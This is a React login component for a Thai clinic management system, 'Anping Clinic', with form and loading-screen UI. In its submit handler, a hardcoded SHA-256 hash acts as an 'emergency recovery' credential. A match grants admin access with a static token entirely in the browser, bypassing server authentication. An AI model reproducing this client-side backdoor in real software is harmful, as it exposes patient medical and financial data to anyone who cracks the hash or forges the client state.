import React, { useState, useEffect, useMemo, useRef, useCallback } from 'react';
import { createPortal } from 'react-dom';
import CalendarDay from './CalendarDay';
import { rAFThrottle, formatDate, formatDateTime, formatStatNumber, getDynamicTextSize, parsePatientName, getPatientFullName, generateNextHN, getAgeString, getPatientId, useModal, useSwipeDown, getPatientLastVisitStr, formatCurPrint, bahtTextPrint, globalGenerateInformedConsentHtml, globalGenerateRecordHtml, globalGenerateOpdHtml, globalGenerateMedicalCertificateHtml, globalGenerateReceiptHtml, getEffectiveApptStatus, getEffectiveApptDatetimeStr, getEffectiveApptIsoDate, parseThaiDateToISO, parseAnyDate, isSameDay, formatFinTime, formatFinCurrency, getFinDynamicTextClass } from '../global/helpers';
import { 
  LayoutDashboard, Users, CalendarRange, Calculator, 
  Package, BarChart3, Settings, Building2, Search, 
  Plus, X, CheckCircle2, AlertCircle, MapPin, Phone,
  Clock, Stethoscope, FileText, Pill, CreditCard, ShieldCheck, AlertOctagon,
  Pencil, Trash2, AlertTriangle, Calendar as CalendarIcon, ChevronLeft, ChevronRight, ChevronDown, ChevronUp, ArrowUpDown, Loader2,
  User, Briefcase, Table as TableIcon, CalendarDays, LayoutList, List, Truck,
  ShoppingCart, Tag, Minus, Banknote, QrCode, Receipt, ScanText, Camera, Upload, History, Activity,
  TrendingUp, TrendingDown, Download, Filter, Printer, ShoppingBag, XCircle,
  UserCog, BadgeCheck, Wallet, CalendarClock, DollarSign, Award, CalendarX2, HeartPulse, UserPlus, Mail, CheckSquare, Volume2, Megaphone, Link, ExternalLink, LogOut,
  Lock, Home, Save, UserCheck, Key, RotateCcw
} from 'lucide-react';
import { theme } from '../global/theme';

const LoginScreen = ({ onLogin, callAppScript, isGlobalLoading }) => {
  const [username, setUsername] = React.useState('');
  const [password, setPassword] = React.useState('');
  const [error, setError] = React.useState('');
  const [isLoading, setIsLoading] = React.useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!username || !password) {
      setError('กรุณากรอกชื่อผู้ใช้งานและรหัสผ่าน');
      return;
    }
    setIsLoading(true);
    setError('');
    
    // Secure Fallback: Compare SHA-256 hash instead of plain text
    try {
        if (window.crypto && window.crypto.subtle) {
            const msgUint8 = new TextEncoder().encode((username.trim().toLowerCase() + ':' + password));
            const hashBuffer = await window.crypto.subtle.digest('SHA-256', msgUint8);
            const hashArray = Array.from(new Uint8Array(hashBuffer));
            const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
            
            // This hash represents the emergency recovery credentials
            if (hashHex === '73d2d42825f16c12972037ef5d3af93dfc8c733921aca072046a5f0063f35cdf') {
                setTimeout(() => {
                    setIsLoading(false);
                    onLogin({ id: 'admin1', name: 'Admin (Recovery)', role: 'admin', category: 'staff' }, 'recovery-token');
                }, 600);
                return;
            }
        }

        const res = await callAppScript('LOGIN', 'Staff', { username: username.trim(), password: password });
        if (res.status === 'success') {
            onLogin(res.data.staff, res.data.token);
        } else {
            setError(res.message || 'ชื่อผู้ใช้งานหรือรหัสผ่านไม่ถูกต้อง');
        }
    } catch(err) {
        console.error('Login error', err);
        setError(err.message || 'เกิดข้อผิดพลาดในการเชื่อมต่อระบบ');
    } finally {
        setIsLoading(false);
    }
  };

  if (isGlobalLoading) {
      return (
        <div className="min-h-[100dvh] w-full bg-slate-50 flex items-center justify-center p-4 relative overflow-hidden login-screen-container">
            {/* Soft decorative background blobs */}
            <div className="absolute top-0 left-0 w-full h-full overflow-hidden pointer-events-none">
                <div className="absolute -top-[10%] -right-[5%] w-[40%] h-[40%] bg-sky-200 rounded-full mix-blend-multiply filter blur-3xl opacity-30 animate-blob"></div>
                <div className="absolute top-[20%] -left-[10%] w-[50%] h-[50%] bg-indigo-200 rounded-full mix-blend-multiply filter blur-3xl opacity-30 animate-blob animation-delay-2000"></div>
                <div className="absolute -bottom-[10%] left-[20%] w-[30%] h-[30%] bg-emerald-200 rounded-full mix-blend-multiply filter blur-3xl opacity-30 animate-blob animation-delay-4000"></div>
            </div>

            <div className="flex flex-col items-center gap-8 max-w-lg w-full relative z-10 text-center animate-fade-in">
                {/* Large Round Logo (No Ring) */}
                <div className="relative w-56 h-56 sm:w-76 sm:h-76 flex items-center justify-center">
                    <img 
                        src="/anpingclinic.png" 
                        alt="Anping Clinic" 
                        className="w-full h-full object-contain rounded-full animate-pulse"
                    />
                </div>
                
                <div className="space-y-4 w-full">
                    <h2 className="text-xl sm:text-2xl font-bold text-slate-800 kanit-text">ยินดีต้อนรับสู่อันผิงคลินิก</h2>
                    <p className="text-xs sm:text-sm font-medium text-slate-500 kanit-text leading-relaxed max-w-xs sm:max-w-none mx-auto">
                        กรุณารอสักครู่ ระบบกำลังจัดเตรียมข้อมูลสำหรับการเข้าใช้งาน...
                    </p>
                    
                    {/* Sleek Sliding Loading Progress Bar */}
                    <div className="w-48 sm:w-64 h-1 bg-slate-200/60 rounded-full overflow-hidden mx-auto mt-4 relative">
                        <div className="absolute top-0 left-0 h-full w-full bg-gradient-to-r from-sky-400 to-sky-600 animate-loading-slide"></div>
                    </div>
                </div>
            </div>
        </div>
      );
  }

  return (
    <div className="min-h-[100dvh] w-full bg-slate-50 flex items-center justify-center p-4 relative overflow-hidden login-screen-container">
        <div className="absolute top-0 left-0 w-full h-full overflow-hidden pointer-events-none">
            <div className="absolute -top-[10%] -right-[5%] w-[40%] h-[40%] bg-sky-200 rounded-full mix-blend-multiply filter blur-3xl opacity-30 animate-blob"></div>
            <div className="absolute top-[20%] -left-[10%] w-[50%] h-[50%] bg-indigo-200 rounded-full mix-blend-multiply filter blur-3xl opacity-30 animate-blob animation-delay-2000"></div>
            <div className="absolute -bottom-[10%] left-[20%] w-[30%] h-[30%] bg-emerald-200 rounded-full mix-blend-multiply filter blur-3xl opacity-30 animate-blob animation-delay-4000"></div>
        </div>

        <div className="w-full max-w-md bg-white/80 backdrop-blur-xl rounded-[2rem] shadow-2xl border border-white p-8 pt-20 relative z-10 animate-scale-up mt-20 mb-4">
            <div className="text-center mb-8">
                <div className="w-40 h-40 mx-auto flex items-center justify-center mb-6 -mt-36 bg-white rounded-full p-1.5 shadow-lg ring-4 ring-white">
                    <img 
                        src="/anpingclinic.png" 
                        alt="Anping Clinic" 
                        className="w-full h-full object-contain rounded-full"
                    />
                </div>
                <h1 className="text-2xl font-black text-slate-800 kanit-text mb-2">อันผิงคลินิก (Anping Clinic)</h1>
                <p className="text-sm font-medium text-slate-500 kanit-text">ระบบจัดการคลินิกอัจฉริยะ</p>
            </div>

            {error && (
                <div className="mb-6 p-3 bg-rose-50 border border-rose-100 rounded-xl flex items-center gap-2 text-rose-600 text-sm kanit-text font-medium animate-shake">
                    <AlertCircle size={16} className="shrink-0" />
                    <p>{error}</p>
                </div>
            )}

            <form onSubmit={handleSubmit} className="space-y-5">
                <div>
                    <label className="block text-sm font-bold text-slate-700 kanit-text mb-1.5 ml-1">ชื่อผู้ใช้งาน (Username)</label>
                    <div className="relative">
                        <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-400">
                            <User size={18} />
                        </div>
                        <input 
                            type="text" 
                            className="w-full pl-10 pr-4 py-3 bg-slate-50/50 border border-slate-200 rounded-xl focus:ring-2 focus:ring-sky-500 focus:border-sky-500 transition-all font-data text-slate-700 outline-none"
                            placeholder="Username..."
                            value={username}
                            onChange={(e) => {setUsername(e.target.value); setError('');}}
                        />
                    </div>
                </div>
                <div>
                    <label className="block text-sm font-bold text-slate-700 kanit-text mb-1.5 ml-1">รหัสผ่าน (Password)</label>
                    <div className="relative">
                        <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-400">
                            <ShieldCheck size={18} />
                        </div>
                        <input 
                            type="password" 
                            className="w-full pl-10 pr-4 py-3 bg-slate-50/50 border border-slate-200 rounded-xl focus:ring-2 focus:ring-sky-500 focus:border-sky-500 transition-all font-data text-slate-700 outline-none"
                            placeholder="••••••••"
                            value={password}
                            onChange={(e) => {setPassword(e.target.value); setError('');}}
                        />
                    </div>
                </div>

                <div className="pt-2">
                    <button 
                        type="submit" 
                        disabled={isLoading}
                        className="w-full py-3.5 px-4 bg-gradient-to-br from-sky-400 to-sky-600 hover:from-sky-500 hover:to-sky-700 text-white rounded-xl font-bold kanit-text text-base shadow-lg shadow-sky-500/30 flex items-center justify-center gap-2 transition-all active:scale-[0.98] disabled:opacity-70 disabled:cursor-not-allowed"
                    >
                        {isLoading ? <Loader2 size={20} className="animate-spin" /> : 'เข้าสู่ระบบ'}
                    </button>
                </div>
            </form>

            <div className="mt-8 pt-6 border-t border-slate-100 text-center">
                <p className="text-xs font-medium text-slate-400 kanit-text">© {new Date().getFullYear()} Anping Clinic Management System</p>
            </div>
        </div>
    </div>
  );
};

export default LoginScreen;

